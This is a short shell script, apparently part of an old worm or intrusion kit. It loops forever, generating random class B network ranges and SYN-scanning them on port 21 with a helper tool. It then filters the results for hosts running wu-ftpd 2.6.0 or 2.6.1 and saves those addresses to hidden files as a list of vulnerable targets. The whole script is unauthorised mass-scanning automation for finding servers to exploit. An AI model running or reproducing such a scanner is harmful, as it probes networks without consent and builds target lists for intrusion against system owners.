#!/bin/sh
if /sbin/route | grep ppp0 >> /dev/null
 then
   DEVICE="ppp0"
   SPEED="dialup"
 else
   DEVICE="eth0"
   SPEED="t1"
fi


while true
 do
  CLASSB=`./randb`
echo "$CLASSB $DEVICE $SPEED" 
  ./synscan $CLASSB .heh $DEVICE $SPEED 21 >/dev/null
 cat .heh |grep wu-2.6.0 |cut -d "(" -f 1 >> .w
 cat .heh |grep wu-2.6.1 |cut -d "(" -f 1 >> .l
 rm -f .heh
done

